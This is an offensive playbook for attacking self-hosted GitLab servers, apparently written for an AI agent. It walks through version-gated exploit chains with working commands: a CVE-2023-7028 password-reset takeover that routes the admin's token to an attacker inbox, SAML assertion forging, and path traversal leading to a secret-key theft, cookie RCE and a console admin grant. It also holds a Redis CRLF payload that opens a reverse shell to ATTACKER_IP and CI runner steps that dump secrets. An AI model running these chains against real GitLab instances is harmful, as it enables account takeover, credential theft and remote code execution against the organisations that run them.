---
technology: "GitLab"
kind: bug-bounty-methodology
audience: ai-agent
family: web-platforms
version: "1.0"
status: thin
provenance: "field-grounded (real deployments: SSRF+CRLF→Redis RCE on 11.4.7 + gitlab.rb creds; CVE-2024-45409 SAML bypass on 17.3.2 + runner env dump; CVE-2020-10977 file read → secret_key_base → marshalled cookie RCE → rails-console admin; cred autofill + git-hook deploy; fingerprint-only side target; webhook→container RCE) + upstream-verified (GitLab advisory 16.7.2 release notes & qualys/kroll summaries for CVE-2023-7028 ranges/payload; advisories.gitlab.com + GitLab 17.3.3 release for CVE-2024-45409; NVD CVE-2020-10977; NVD/exploit-db for CVE-2018-19571/-19585; docs.gitlab.com GraphQL page). Thin unit (6 engagements) — version gates and mechanics are upstream-verified, chains are field-shown. Companion overview: [[gitlab|GitLab]]."
---

# GitLab bug bounty methodology

Target model: self-managed GitLab CE/EE (Omnibus typical), nginx-fronted on 80/443
(odd ports happen — 5080 observed once), with optional SAML SSO and CI runners.
Authorization assumed.

Scope discipline: GitLab-product surface. The sibling lightweight product is the
[[gitea|Gitea/Gogs]] unit; generic Rails bugs and generic SSO theory live elsewhere.
Every CVE below was verified against GitLab advisories/NVD — ranges are exact.

## Triage table (version-gated)

| Family | Affected (verified) | Pre-auth? | Payoff |
|---|---|---|---|
| CVE-2023-7028 password-reset takeover | 16.1–16.1.5, 16.2–16.2.8, 16.3–16.3.6, 16.4–16.4.4, 16.5–16.5.5, 16.6–16.6.3, 16.7–16.7.1 | yes | Any account incl. admin; 2FA blocks takeover (CVSS 10.0) |
| CVE-2024-45409 SAML bypass | <17.3.3 / 17.2.7 / 17.1.8 / 17.0.8 / 16.11.10 (SAML-configured only) | forged SAML | Log in as any user |
| CVE-2020-10977 file read (issue move) | 8.5–12.9 | account | Arbitrary read → secret_key_base → RCE |
| CVE-2018-19571 + -19585 SSRF/CRLF (import URL) | 8.18–11.3.10, 11.4–11.4.7, 11.5–11.5.0 | account | Redis queue injection → RCE |

## Phase 0 — Fingerprint and version gate

```bash
nmap -sV -p 80,443,5080 198.51.100.10
# |_http-title: Sign in \xc2\xb7 GitLab        → product identified (observed twice)
curl -s http://198.51.100.10/users/sign_in -o /dev/null -w '%{http_code}\n'
curl -s http://198.51.100.10/robots.txt        # /autocomplete/users /api/v* /help /-/ide/
curl -s http://198.51.100.10/help | head        # version on the help page
```

- `/help` disclosed the exact build on all three observed versions; if blank/locked,
  try authenticated or the footer. Version → triage table gate. No version → treat
  as current-patched and pivot to enum/auth chains.
- robots.txt's disallow list (`/autocomplete/users`, `/search`, `/api/v*`, `/-/ide/`)
  maps the surface for you.

## Phase 1 — Enumeration

- **Explore (logged out)**: Projects → Explore → All. Read public repos, members,
  activity. One observed engagement pulled a Python automation script from a public
  repo containing a working user password.
- **Autocomplete endpoints** (`/autocomplete/users`, `/search`) — username harvest.
- **REST with any token**: `/api/v4/version`, `/api/v4/users`, projects, members.
- **GraphQL** (upstream docs): endpoint `/api/graphql`; some queries work
  **unauthenticated** for public data; mutations always need auth; token or session
  cookie both authenticate. Interactive explorer at `/-/graphql-explorer`.

```bash
curl -s http://198.51.100.10/api/graphql -H 'content-type: application/json' \
  -d '{"query":"{ projects(first: 100) { nodes { name fullPath visibility } } }"}'
```

## Phase 2 — CVE-2023-7028: password-reset takeover (16.1–16.7.1)

Bug: reset emails could be delivered to **unverified** addresses — the reset form
accepts an email *array*; GitLab finds the user by the verified entry but delivers
the token to every entry (GitLab advisory, verified).

```bash
curl -s -X POST 'http://198.51.100.10/users/password.json' \
  -d 'user[email][]=admin@example.com&user[email][]=attacker@ATTACKER_HOST.example'
# token lands in YOUR inbox for the admin's account; 2FA targets get a password
# reset but not a takeover (second factor still required at login)
```

Gate on exact ranges from the triage table (fixes: 16.7.2, 16.6.4, 16.5.6, backports
to 16.1.6/16.2.9/16.3.7/16.4.5). A public PoC has existed since Jan 2024 — assume
scanners hit it too; prefer admin targets, note SSO-only instances are largely moot.

## Phase 3 — CVE-2024-45409: SAML bypass (below 17.3.3 family)

Root cause is in ruby-saml (≤12.2, 1.13.0–1.16.0): signature verification uses a
wrong XPath selector, so **any IdP-signed document can be re-crafted to assert a
different user** — the signature stays "valid" (advisory + CERT-EU, verified).

Chain shape (observed live, v17.3.2 + Authentik):
1. Authenticate to the IdP once as yourself (capture a legitimately signed SAML
   response during the SSO handoff).
2. Re-craft the assertion: keep the signature, swap the NameID/`extern_uid` to the
   target (e.g. `akadmin`).
3. GitLab logs you in as the target. Public PoCs exist for the wrap technique.

Applies **only when SAML auth is configured**. Fixes bumped omniauth-saml 2.2.1 /
ruby-saml 1.17.0 (GitLab 17.3.3, 17.2.7, 17.1.8, 17.0.8, 16.11.10 + 16.x backports).

## Phase 4 — CVE-2020-10977: file read → marshalled-cookie RCE (8.5–12.9)

1. Create two projects; file an issue whose **upload/description carries a traversal
   path** (`/uploads/../../../etc/passwd` style), then move the issue to the second
   project — the UploadsRewriter copies the referenced file into the new project and
   renders it (NVD + field-observed).
2. Read the kill file:
   `/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml` → `secret_key_base`.
3. Cookie RCE: stand up the **same GitLab version locally** (`gitlab-ctl
   reconfigure`), drop in the stolen `secret_key_base`, and craft a marshalled
   payload in the `experimentation_subject_id` cookie through `gitlab-rails console`
   (field-proven recipe; Metasploit `exploit/multi/http/gitlab_file_read_rce`
   automates the pair).
4. Post-RCE, the rails console is admin:

```ruby
user = User.find_by(username: 'arkanoid')
user.admin = true ; user.save!        # observed — instant administrator
```

## Phase 5 — CVE-2018-19571/-19585: import-URL SSRF+CRLF → Redis RCE (≤11.4.7 era)

Project creation accepts `project[import_url]`; the `git://` scheme (and IPv6-mapped
localhost) survives the SSRF filter, and CRLF in the URL speaks **Redis protocol**
to the local Redis (observed live on 11.4.7, exploit-db-verified pair):

```text
project[import_url]=git://[0:0:0:0:0:ffff:127.0.0.1]:6379/test\x0d\x0a multi \x0d\x0a
  sadd resque:gitlab:queues system_hook_push \x0d\x0a lpush resque:gitlab:queue:system_hook_push
  '{"class":"GitlabShellWorker","args":["class_eval","open(\'| nc ATTACKER_IP 4444 -e /bin/bash\').read"],...}'
```

Fixes landed across 11.3.11 / 11.4.8 / 11.5.1. Ancient-instance check; pair with
Phase 0's version read.

## Phase 6 — Auth surfaces and non-CVE chains

- **Credential autofill/bookmark tricks** (observed): a "Gitlab Login" browser
  bookmark carried JS that populated `user_login`/`user_password` — client-side
  secret storage on the org's own portal; check bookmarks and password managers in
  scope.
- **Git-hook deploys** (observed): developer repo write → post-merge/post-checkout hook (or profile-script repo + `git pull` on a timer) = code exec as the pulling user.
- **Webhooks** (observed): project webhooks deliver authenticated POSTs into the
  internal network; a webhook on an admin repo was the container-RCE foothold.
- **Config-at-rest**: `/opt/backup/gitlab.rb` (or `/etc/gitlab/gitlab.rb`) greps out
  initial root passwords and integration secrets (observed root path).

## Phase 7 — Runner abuse (post-project-write or admin)

`.gitlab-ci.yml` in any project a runner serves:

```yaml
image: redis:alpine          # you pick the container
script: [ env ]              # dump the job environment (observed)
```

- Secrets ride env vars into jobs (CI/CD variables) — an env dump is the prize.
- Runner tags pick the runner; shared runners mean someone else's build host.
- Docker-executor runners with mounted sockets/docker group = host compromise track.
- Admin panel (observed) shows runners, tokens, and the CI fleet — admin is
  not just user management, it's compute.

## Command quick reference

```bash
# fingerprint/version
curl -s http://198.51.100.10/help | head
curl -s http://198.51.100.10/robots.txt
# enum
curl -s 'http://198.51.100.10/api/graphql' -H 'content-type: application/json' \
  -d '{"query":"{projects(first:100){nodes{name fullPath visibility}}}"}'
curl -s -H 'PRIVATE-TOKEN: TOK' http://198.51.100.10/api/v4/version
# cve-2023-7028 probe (only within affected ranges)
curl -s -X POST 'http://198.51.100.10/users/password.json' \
  -d 'user[email][]=target@example.com&user[email][]=attacker@ATTACKER_HOST.example'
# on-box post-exploitation
sudo gitlab-ctl status ; sudo gitlab-rails console
```

## Tooling (prose)

curl drives REST/GraphQL and the reset-form probe; Metasploit carries the
gitlab_file_read_rce automation for the 12.8-era chain; metasploit/burp handle the
SAML response editing; git + ssh cover repo access; the rails console needs no tools
beyond the target itself. Tools live in the tools vault.

## References

- GitLab advisory/release notes: 16.7.2 critical release (CVE-2023-7028), 17.3.3
  patch release (CVE-2024-45409); advisories.gitlab.com ruby-saml record.
- NVD: CVE-2020-10977; CVE-2018-19571 / CVE-2018-19585 (exploit-db 49257 pairs them).
- docs.gitlab.com: GraphQL API (auth model, unauthenticated queries).
- Evidence ledger: engagement chains behind this page (ledger in
  internal coverage ledger).
